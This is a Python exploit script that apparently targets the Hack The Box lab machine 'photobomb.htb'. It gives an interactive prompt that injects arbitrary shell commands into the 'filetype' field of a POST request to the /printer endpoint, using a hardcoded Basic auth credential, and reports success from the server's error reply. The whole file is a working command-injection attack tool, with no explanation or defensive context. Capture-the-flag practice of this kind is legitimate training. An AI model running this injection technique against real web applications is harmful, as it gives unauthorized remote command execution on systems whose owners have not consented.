import os
import subprocess
import urllib.parse
from colorama import Fore, Style

def execute(command):
	target = 'http://photobomb.htb/printer'
	auth_header = 'Authorization: Basic cEgwdDA6YjBNYiE='
	post_data = 'photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&dimensions=3000x2000&filetype=jpg;'
	cmd = f"""curl -H '{auth_header}' -X POST {target} -d '{post_data}{urllib.parse.quote_plus(command)}'"""
	run = subprocess.run(cmd, shell=True, capture_output=True)
	if (run.stdout == b'Failed to generate a copy of andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg'):
		print(Fore.GREEN + 'Command execution successful!' + Style.RESET_ALL)
	else:
		print(Fore.RED + 'Command execution failed!' + Style.RESET_ALL)

def main():
	while True:
		command = input(Fore.BLUE + "[*] Command >> " + Style.RESET_ALL)
		if (command == "exit"):
			print(Fore.RED + "Bye!!" + Style.RESET_ALL)
			exit(0)
		execute(command)

if __name__ == "__main__":
	main()
